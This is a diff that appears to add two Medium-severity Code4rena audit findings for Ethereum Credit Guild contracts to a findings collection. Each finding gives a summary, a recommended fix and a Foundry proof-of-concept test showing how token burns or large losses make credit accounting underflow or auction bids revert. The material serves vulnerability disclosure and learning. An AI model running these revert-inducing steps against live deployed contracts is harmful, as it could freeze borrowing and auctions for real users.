@@ -89,3 +89,82 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
 </details>
+
+## 2.[Medium] TotalBorrowedCredit can revert, breaking gauges.
+
+### CreditMultiplier affect totalBorrowedCredit
+
+- Summary: Changes in the creditMultiplier can cause issues in the totalBorrowedCredit function, potentially leading to reverting due to underflow. This affects debt ceiling calculations and can break borrow operations, impacting functionality.
+
+- Impact & Recommendation: To prevent failures, either cap totalBorrowedCredit at 0 or track total tokens minted and burned by the PSM module to remove dependence on creditMultiplier.
+  🐬: [Source](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1170) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+
+    function testAttackRevert() public {
+    // grant roles to test contract
+    vm.startPrank(governor);
+    core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(this));
+    core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
+    vm.stopPrank();
+    emit log_named_uint('TBC 1', profitManager.totalBorrowedCredit());
+    // psm mint 100 CREDIT
+    pegToken.mint(address(this), 100e6);
+    pegToken.approve(address(psm), 100e6);
+    psm.mint(address(this), 100e6);
+    emit log_named_uint('TBC 2', profitManager.totalBorrowedCredit());
+    // apply a loss
+    // 50 CREDIT of loans completely default (50 USD loss)
+    profitManager.notifyPnL(address(this), -50e18);
+    emit log_named_uint('TBC 3', profitManager.totalBorrowedCredit());
+    // burn tokens to throw off the ratio
+    credit.burn(70e18);
+    vm.expectRevert();
+    emit log_named_uint('TBC 4', profitManager.totalBorrowedCredit());
+    }
+
+
+  ```
+
+  </details>
+
+## 2.[Medium] PnL system can be broken by large users intentionally or unintentionally.
+
+### CreditMultiplier affected by `creditTotalSupply - loss < 0`
+
+- Summary: The notifyPnL function in ProfitManager.sol calculates the credit multiplier based on creditTotalSupply minus loss. If the loss exceeds creditTotalSupply, it causes a revert, breaking gauge slashing and voting systems.
+
+- Impact & Recommendation: Excessive losses cause gauge vote slashing, decrease the creditMultiplier, and disrupt the auction process. If the loss exceeds creditTotalSupply, setting the creditMultiplier to 0 prevents system breakdown.
+  🐬: [Source](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1166) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+
+    function testAttackBid() public {
+    bytes32 loanId = _setupAndCallLoan();
+    uint256 PHASE_1_DURATION = auctionHouse.midPoint();
+    uint256 PHASE_2_DURATION = auctionHouse.auctionDuration() - auctionHouse.midPoint();
+    vm.roll(block.number + 1);
+    vm.warp(block.timestamp + PHASE_1_DURATION + (PHASE_2_DURATION * 2) / 3);
+    // At this time, get full collateral, repay half debt
+    (uint256 collateralReceived, uint256 creditAsked) = auctionHouse.getBidDetail(loanId);
+    emit log_named_uint('collateralReceived', collateralReceived);
+    emit log_named_uint('creditAsked', creditAsked);
+    vm.startPrank(borrower);
+    credit.burn(20_000e18);
+    vm.stopPrank();
+    // bid
+    credit.mint(bidder, creditAsked);
+    vm.startPrank(bidder);
+    credit.approve(address(term), creditAsked);
+    vm.expectRevert();
+    auctionHouse.bid(loanId);
+    vm.stopPrank();
+    }
+
+  ```
+
+  </details>
